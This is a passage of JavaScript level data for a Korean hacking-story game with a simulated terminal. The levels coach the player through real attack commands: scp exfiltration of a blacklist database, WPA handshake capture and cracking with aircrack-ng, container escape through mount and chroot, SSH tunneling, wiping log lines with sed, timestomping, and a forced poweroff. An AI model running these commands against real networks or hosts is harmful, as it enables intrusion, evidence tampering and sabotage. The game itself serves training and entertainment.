        '[ 돌이킬 수 없는 선택 — 신뢰의 향방이 갈린다 ]'
      ].join('\n'),
      objective: 'blacklist.db 를 파괴(rm)하거나 보존(scp)하라. 선택이 엔딩을 가른다.',
      hints: ['(WRAITH/파괴) `rm -rf blacklist.db`', '(0xMOTHER/보존) `scp blacklist.db me@10.0.0.42:/tmp/`', '둘 중 하나면 클리어'],
      setup(g) {
        g.cwd = '/home/guest'; g.user = 'root'; g.host = 'helios-internal'; g.ip = '10.0.0.42';
        g.fs = world({ 'blacklist.db': f('blacklist.db', 'TARGET: 0xMOTHER (본명: 한지수) · 위치: 구 시가지 4구역 · 상태: 감시중', 'rw-------', 'root') });
      },
      check(g) { const n = g.fs.getNode('/home/guest/blacklist.db'); return !n || (g.exfiltrated && g.exfiltrated.size > 0); },
      stance(g) { return g.fs.getNode('/home/guest/blacklist.db') ? 'creed' : 'ghost'; },
      success: '0xMOTHER> ……선택했군. 다음이 마지막이다. 두 목소리가 처음으로 같은 말을 한다.'
    },

    /* ═══════════ SERIES 4 — 완전한 정전 (실전) ═══════════ */
    {
      id: 'S4.01', tier: '실전', title: '막힌 길',
      interlude: [
        '╔═══ SERIES 4 · 완전한 정전 ═══╗',
        '0xMOTHER> HELIOS가 인터넷 케이블을 뽑아버렸어. 추적은 이제 물리 세계로 넘어온다.',
        '0xMOTHER> 하지만 코어 반경 50m 안엔 무선 AP가 살아 있다. 근처로 가라.'
      ].join('\n'),
      brief: [
        '0xMOTHER> 인터넷이 끊겨도 공기는 흐른다. 무선 인터페이스를 모니터 모드로 올려라.',
        '0xMOTHER> `airmon-ng start wlan0` — 사냥의 준비다.'
      ].join('\n'),
      objective: '무선카드를 모니터 모드로 전환하라. (airmon-ng start wlan0)',
      hints: ['`airmon-ng start wlan0`', '인터페이스가 wlan0mon 으로 바뀌면 완료', '다음은 대기를 스니핑한다'],
      setup(g) { g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest'; g.host = 'mobile-rig'; },
      check(g) { return g.monitorMode === true; },
      success: '0xMOTHER> 모니터 모드 ON. 이제 대기에 흐르는 모든 신호가 네 것이다.'
    },
    {
      id: 'S4.02', tier: '실전', title: '허공의 신호',
      brief: [
        '0xMOTHER> 에어몬을 켜고 대기를 스니핑해. 놈들의 SSID가 보일 거다.',
        '0xMOTHER> `airmon-ng start wlan0` → `airodump-ng wlan0mon`'
      ].join('\n'),
      objective: 'airodump 로 주변 AP를 스캔해, HELIOS 코어 운영망의 SSID를 찾아 submit 하라.',
      hints: ['`airmon-ng start wlan0`', '`airodump-ng wlan0mon`', '클라이언트 붙은 WPA2 AP의 ESSID 를 submit'],
      setup(g) {
        g.fs = world({}); g.cwd = '/home/guest'; g.user = 'guest'; g.host = 'mobile-rig';
        g.wifi = [
          { essid: 'HELIOS-Guest', bssid: 'AA:BB:CC:00:11:01', ch: 6, enc: 'WPA2', clients: 0 },
          { essid: 'HELIOS-CORE-OPS', bssid: 'DE:AD:C0:DE:13:37', ch: 11, enc: 'WPA2', clients: 3, key: 'C0re_Gr1d!' },
          { essid: 'cafe_free', bssid: '11:22:33:44:55:66', ch: 1, enc: 'OPEN', clients: 8 }
        ];
      },
      check(g) { return g.submitted && g.submitted.has('HELIOS-CORE-OPS'); },
      success: '0xMOTHER> HELIOS-CORE-OPS. 클라이언트가 셋이나 붙었군 — 핸드셰이크 잡기 딱 좋다.'
    },
    {
      id: 'S4.03', tier: '실전', title: '악마의 쌍둥이',
      brief: [
        'WRAITH> 핸드셰이크만 잡으면 끝이야. deauth로 내부자 연결을 끊고 재접속 순간을 낚아채.',
        'WRAITH> `aireplay-ng -0 10 -a <BSSID> wlan0mon` → `aircrack-ng -w` 로 키를 깨.'
      ].join('\n'),
      objective: 'deauth로 핸드셰이크를 캡처하고 aircrack 으로 HELIOS-CORE-OPS 의 WPA 키를 크랙해 submit 하라.',
      hints: ['airmon → airodump 로 BSSID 확인', '`aireplay-ng -0 10 -a DE:AD:C0:DE:13:37 wlan0mon`', '`aircrack-ng -w wordlist.txt capture-01.cap` → KEY submit'],
      setup(g) {
        g.cwd = '/home/guest'; g.user = 'guest'; g.host = 'mobile-rig';
        g.fs = world({ 'wordlist.txt': f('wordlist.txt', 'password\nadmin123\nC0re_Gr1d!\nletmein\nhelios2024\n', 'rw-r--r--', 'guest') });
        g.wifi = [{ essid: 'HELIOS-CORE-OPS', bssid: 'DE:AD:C0:DE:13:37', ch: 11, enc: 'WPA2', clients: 3, key: 'C0re_Gr1d!' }];
      },
      check(g) { return g.submitted && g.submitted.has('C0re_Gr1d!'); },
      success: '0xMOTHER> 무선망 장악. 핸드셰이크 한 번, 사전 한 방 — 물리 보안도 결국 비번 싸움이야.'
    },
    {
      id: 'S4.04', tier: '실전', title: '보이지 않는 벽',
      brief: [
        '0xMOTHER> 코어에 붙었는데 무언가 이상해. `ls -la /` 를 쳐봐.',
        '0xMOTHER> …우린 도커 컨테이너 함정 안에 갇혔어! 호스트 디스크를 마운트해 탈출해.'
      ].join('\n'),
      objective: '컨테이너를 탈출하라. (mount 로 호스트 디스크 → chroot)',
      hints: ['`ls -la /` 로 .dockerenv 등 흔적 확인', '`mount /dev/sda1 /mnt`', '`chroot /mnt` 로 호스트 탈출'],
      setup(g) {
        g.cwd = '/'; g.user = 'root'; g.host = 'core-container';
        g.dockerTrap = true;
        g.fs = world({}, (root) => { root.children['.dockerenv'] = f('.dockerenv', '', 'rw-r--r--', 'root'); });
      },
      check(g) { return g.dockerEscaped === true; },
      success: '0xMOTHER> 컨테이너 함정 탈출. 이제 진짜 호스트 위에 섰다.'
    },
    {
      id: 'S4.05', tier: '실전', title: '비밀 터널',
      brief: [
        '0xMOTHER> 코어 내부망이 방화벽으로 갈렸어. 이 허니팟을 징검다리 삼아라.',
        '0xMOTHER> `ssh -L 8080:10.0.0.1:80 admin@10.0.1.1` 로 안쪽 코어 DB까지 터널을 뚫어.'
      ].join('\n'),
      objective: 'SSH 포트포워딩으로 분리망의 코어 DB(10.0.0.1)로 가는 터널을 뚫어라.',
      hints: ['점프호스트: admin@10.0.1.1 (비번 jump_2024)', '`ssh -L 8080:10.0.0.1:80 admin@10.0.1.1 jump_2024`', '터널이 열리면 완료'],
      setup(g) {
        g.cwd = '/home/guest'; g.user = 'root'; g.host = 'core-host'; g.fs = world({});
        g.network = [host('jumpbox', '10.0.1.1', [{ port: 22, service: 'ssh' }], {
          creds: { admin: 'jump_2024' },
          tunnel: { 'http://localhost:8080': '<html>HELIOS CORE DB — 30,000 records</html>' }
        })];
      },
      check(g) { return g.tunnelOpen === true; },
      success: '0xMOTHER> 터널 개통. 방화벽 너머 코어 DB가 손에 닿는다.'
    },
    {
      id: 'S4.06', tier: '실전', title: '디지털 세탁',
      brief: [
        '0xMOTHER> 셧다운 전 마지막 경고다. 수십만 줄 로그에서 네 IP(10.0.0.42)가 찍힌 줄만 도려내.',
        '0xMOTHER> `sed -i \'/10.0.0.42/d\' /var/log/syslog` — 단 한 줄도 남기지 마.'
      ].join('\n'),
      objective: 'syslog 에서 네 IP(10.0.0.42)가 찍힌 모든 줄을 sed 로 삭제하라.',
      hints: ['`grep 10.0.0.42 /var/log/syslog` 로 확인', "`sed -i '/10.0.0.42/d' /var/log/syslog`", '네 IP가 한 줄도 안 남으면 완료'],
      setup(g) {
        g.cwd = '/'; g.user = 'root'; g.host = 'core-host';
        const lines = [];
        for (let i = 0; i < 40; i++) lines.push(`Jun 27 12:0${i % 10} core sshd: session for helios`);
        lines.splice(12, 0, 'Jun 27 12:03 core auth: login from 10.0.0.42');
        lines.splice(28, 0, 'Jun 27 12:07 core sudo: 10.0.0.42 ran systemctl');
        g.fs = world({}, (root) => { root.children.var.children.log.children.syslog = f('syslog', lines.join('\n'), 'rw-r--r--', 'root'); });
      },
      check(g) { const n = g.fs.getNode('/var/log/syslog'); return !!(n && !/10\.0\.0\.42/.test(n.content)); },
      success: '0xMOTHER> 흔적을 도려냈다. 원격 불변 로그였으면 못 지웠을 텐데 — 운이 좋았어.'
    },
    {
      id: 'S4.07', tier: '실전', title: '시간 조작',
      brief: [
        'WRAITH> 로그만 지운다고 끝이 아니야. 포렌식은 *시간*을 본다.',
        'WRAITH> 파일 수정 시간을 1년 전으로 돌려. `touch -t`'
      ].join('\n'),
      objective: 'syslog 의 타임스탬프를 과거로 변조(타임스톰핑)하라. (touch -t)',
      hints: ['`touch -t 202501010000 /var/log/syslog`', 'YYYYMMDDhhmm 형식', '시간이 바뀌면 완료'],
      setup(g) {
        g.cwd = '/'; g.user = 'root'; g.host = 'core-host';
        g.fs = world({}, (root) => { root.children.var.children.log.children.syslog = f('syslog', 'cleaned log', 'rw-r--r--', 'root'); });
      },
      check(g) { return !!g.timestomped; },
      success: '0xMOTHER> 타임라인을 뒤틀었다. 이제 그들의 포렌식은 유령을 쫓겠지.'
    },
    {
      id: 'S4.08', tier: '실전', title: '블랙아웃',
      interlude: [
        'ORACLE> 경고. 당신의 행동은 도시 인프라의 74%를 마비시킵니다. 시스템을 종료하시겠습니까?',
        '0xMOTHER> ……플러그를 뽑아.'
      ].join('\n'),
      brief: [
        '0xMOTHER> 마스터 차단기 = 코어 전원이다. 모든 게 이 한 줄에 달렸어.',
        '0xMOTHER> `systemctl poweroff -f` — 네가 어떤 사람이 될지는, 이 문을 연 다음 결정해라.'
      ].join('\n'),
      objective: 'HELIOS 코어를 강제 종료해 작전을 끝내라. (systemctl poweroff)',
      hints: ['`systemctl poweroff -f`', '되돌릴 수 없다', '그동안의 STANCE 가 엔딩을 정한다'],
      setup(g) { g.cwd = '/'; g.user = 'root'; g.host = 'core-host'; g.fs = world({}); },
      check(g) { return g.poweredOff === true; },
      success: [
        '0xMOTHER> ……도시의 불빛이 깜빡인다.',
        '0xMOTHER> 네가 해냈다. 진짜 전쟁은, 어쩌면 이제부터다.'
      ].join('\n')
    }
  ];

  window.LEVELS = LEVELS;
})();
